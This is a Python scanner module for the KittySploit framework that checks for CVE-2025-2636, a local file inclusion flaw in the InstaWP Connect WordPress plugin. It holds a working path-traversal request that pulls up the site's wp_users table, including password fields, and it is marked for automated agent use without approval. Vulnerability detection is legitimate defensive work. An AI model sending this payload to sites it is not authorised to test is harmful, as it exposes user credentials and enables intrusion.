#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The InstaWP Connect - 1-click WP Staging & Migration plugin for WordPress is vulnerable to Local File Inclusio."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'InstaWP Connect < 0.1.0.86 - Local PHP File Inclusion Detection',
        'description': "The InstaWP Connect - 1-click WP Staging & Migration plugin for WordPress is vulnerable to Local File Inclusion in all versions up to, and including, 0.1.0.85 via the 'instawp-database-manager' parameter. This makes it possible for unauthenticated attackers to include and execute arbitrary files on the server, allowing the execution of any PHP code in those files.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'wp', 'wordpress', 'wp-plugin', 'instawp-connect', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/d1b64725-d4ae-4d73-950a-b772a877022b/',
            'https://www.wordfence.com/threat-intel/vulnerabilities/id/4c8f2c6f-c231-477c-895b-df892569ef95',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-2636',
        ],
        'cve': 'CVE-2025-2636',
    }

    def run(self):
        path = '/?instawp-database-manager=/../../../%2e%2fmigrate%2ftemplates%2fdebug%2fdb-table&table_name=wp_users--%20-'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('instawp-wrap', 'user_pass</th>', 'user_email</th>',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='InstaWP Connect < 0.1.0.86 - Local PHP File Inclusion detected', path=path)
            return True
        return False

